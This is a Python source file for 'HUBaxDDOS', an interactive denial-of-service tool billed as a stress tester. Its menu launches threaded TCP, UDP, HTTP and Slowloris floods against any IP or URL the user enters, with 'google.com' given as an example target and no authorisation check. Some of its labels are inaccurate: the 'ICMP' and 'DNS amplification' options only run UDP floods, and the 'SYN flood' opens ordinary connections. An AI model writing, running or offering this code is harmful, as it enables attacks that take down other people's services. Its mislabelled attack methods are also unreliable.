#!/usr/bin/env python3
"""
HUBaxDDOS - Advanced Network Stress Testing Tool
Author: n0merc
Version: 2.0
"""

import socket
import threading
import random
import time
import sys
from datetime import datetime
from termcolor import colored

# Configuration
MAX_THREADS = 1000
PACKET_SIZE = 4096
TIMEOUT = 3

class HUBaxDDOS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.lock = threading.Lock()
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'target': None
        }
        
    def show_logo(self):
        logo = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗║
║  ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗║
║  ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║║
║  ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║║
║  ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝║
║  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ║
║                                                          ║
║                ██████╗  ██████╗   ██████╗ ███████╗       ║
║                ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝        ║
║                ██║   ██║██║  ██║██║   ██║███████╗        ║
║                ██║   ██║██║  ██║██║   ██║╚════██║        ║
║                ╚██████╔╝██████╔╝╚██████╔╝███████║        ║
║                 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝        ║
║                                                          ║
║            Advanced Network Stress Testing Tool          ║
║                   Version 2.0 - 2026                     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(colored(logo, 'cyan'))
        
    def show_menu(self):
        menu = """
╔══════════════════════════════════════════════════════════╗
║                       HUBaxDDOS MENU                     ║
╠══════════════════════════════════════════════════════════╣
║  [1] TCP Flood Attack      - Standard TCP connection flood║
║  [2] UDP Flood Attack      - Connectionless UDP flood     ║
║  [3] HTTP Flood Attack     - Layer 7 HTTP request flood   ║
║  [4] SYN Flood Attack      - Half-open connection attack  ║
║  [5] ICMP Flood Attack     - Ping flood attack            ║
║  [6] Slowloris Attack      - Slow HTTP headers attack     ║
║  [7] DNS Amplification     - DNS reflection attack        ║
║  [8] Multi-Vector Attack   - Combine multiple methods      ║
║  [9] Show Statistics       - Display attack stats         ║
║  [10] Stop All Attacks     - Stop all running attacks     ║
║  [11] Help                 - Show command instructions    ║
║  [12] Exit                 - Exit the program             ║
╚══════════════════════════════════════════════════════════╝
        """
        print(colored(menu, 'yellow'))

    def generate_payload(self, size=PACKET_SIZE):
        return random._urandom(size)

    def update_stats(self, packets, bytes_count):
        with self.lock:
            self.stats['packets_sent'] += packets
            self.stats['bytes_sent'] += bytes_count

    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
        print(colored(f"[+] Starting TCP Flood on {target_ip}:{target_port}", 'green'))
        self.attack_running = True
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    s.connect((target_ip, target_port))
                    s.send(self.generate_payload(1024))
                    self.update_stats(1, 1024)
                    print(colored(f"[*] TCP Request sent to {target_ip}:{target_port}", 'blue'))
                    s.close()
                except:
                    pass # Connection failed мэдэгдлийг нуув
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def udp_flood(self, target_ip, target_port, threads=500, duration=60):
        print(colored(f"[+] Starting UDP Flood on {target_ip}:{target_port}", 'green'))
        self.attack_running = True
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                end_time = time.time() + duration
                while time.time() < end_time and self.attack_running:
                    try:
                        sock.sendto(self.generate_payload(), (target_ip, target_port))
                        self.update_stats(1, PACKET_SIZE)
                        print(colored(f"[*] UDP Packet sent to {target_ip}:{target_port}", 'magenta'))
                    except: pass
                sock.close()
            except: pass
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def http_flood(self, url, threads=300, duration=60):
        print(colored(f"[+] Starting HTTP Flood on {url}", 'green'))
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        self.attack_running = True
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_host, 80))
                    req = f"GET /?{random.randint(1,1000)} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
                    s.send(req)
                    self.update_stats(1, len(req))
                    print(colored(f"[*] HTTP GET Request sent to {target_host}", 'cyan'))
                    s.close()
                except: pass
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def syn_flood(self, target_ip, target_port, threads=500, duration=60):
        print(colored(f"[+] Starting SYN Flood on {target_ip}:{target_port}", 'green'))
        self.attack_running = True
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(0)
                    try: s.connect((target_ip, target_port))
                    except: pass
                    self.update_stats(1, 0)
                    print(colored(f"[*] SYN connection attempt at {target_ip}:{target_port}", 'yellow'))
                except: pass
        for _ in range(threads):
            threading.Thread(target=attack, daemon=True).start()

    def slowloris(self, url, threads=200, duration=60):
        print(colored(f"[+] Starting Slowloris on {url}", 'green'))
        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
        self.attack_running = True
        def attack():
            end_time = time.time() + duration
            sockets = []
            try:
                for _ in range(threads):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_host, 80))
                    s.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    sockets.append(s)
                    print(colored(f"[*] Slowloris session opened for {target_host}", 'white'))
                while time.time() < end_time and self.attack_running:
                    for s in sockets:
                        try:
                            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                            self.update_stats(1, 0)
                            print(colored(f"[*] Keep-alive header sent to {target_host}", 'white'))
                        except: sockets.remove(s)
                    time.sleep(15)
            except: pass
        threading.Thread(target=attack, daemon=True).start()

    def show_stats(self):
        if not self.stats['start_time']:
            print(colored("[!] No active attack data.", 'red'))
            return
        print(colored(f"\n--- STATISTICS ---", 'cyan'))
        print(f"Target: {self.stats['target']}")
        print(f"Packets Sent: {self.stats['packets_sent']:,}")
        print(f"Status: {'RUNNING' if self.attack_running else 'STOPPED'}")

    def stop_attack(self):
        self.attack_running = False
        print(colored("[!] All attacks stopped.", 'red'))

    def interactive_mode(self):
        self.show_logo()
        self.show_menu()
        while True:
            try:
                cmd = input(colored("\nHUBaxDDOS> ", 'white')).strip().lower()
                if cmd in ['12', 'exit']: break
                elif cmd in ['11', 'help']: print("[!] Enter 1-8 for attacks, 9 for stats, 10 to stop.")
                elif cmd in ['10', 'stop']: self.stop_attack()
                elif cmd in ['9', 'stats']: self.show_stats()
                elif cmd in ['1', 'tcp']:
                    self.stats['target'] = input("Target IP: ")
                    port = int(input("Port: "))
                    self.stats['start_time'] = datetime.now()
                    self.tcp_flood(self.stats['target'], port)
                elif cmd in ['2', 'udp']:
                    self.stats['target'] = input("Target IP: ")
                    port = int(input("Port: "))
                    self.stats['start_time'] = datetime.now()
                    self.udp_flood(self.stats['target'], port)
                elif cmd in ['3', 'http']:
                    self.stats['target'] = input("URL (google.com): ")
                    self.stats['start_time'] = datetime.now()
                    self.http_flood(self.stats['target'])
                elif cmd in ['4', 'syn']:
                    self.stats['target'] = input("Target IP: ")
                    port = int(input("Port: "))
                    self.stats['start_time'] = datetime.now()
                    self.syn_flood(self.stats['target'], port)
                elif cmd in ['5', 'icmp']:
                    self.stats['target'] = input("Target IP: ")
                    self.stats['start_time'] = datetime.now()
                    self.udp_flood(self.stats['target'], 1) 
                elif cmd in ['6', 'slow']:
                    self.stats['target'] = input("URL (google.com): ")
                    self.stats['start_time'] = datetime.now()
                    self.slowloris(self.stats['target'])
                elif cmd in ['7', 'dns']:
                    self.stats['target'] = input("Target IP: ")
                    self.stats['start_time'] = datetime.now()
                    self.udp_flood(self.stats['target'], 53)
                elif cmd in ['8', 'multi']:
                    self.stats['target'] = input("Target IP: ")
                    port = int(input("Port: "))
                    self.stats['start_time'] = datetime.now()
                    self.tcp_flood(self.stats['target'], port)
                    self.udp_flood(self.stats['target'], port)
                else: print(colored("[!] Invalid selection.", 'red'))
            except Exception as e: print(colored(f"Error: {e}", 'red'))

if __name__ == "__main__":
    tool = HUBaxDDOS()
    tool.interactive_mode()
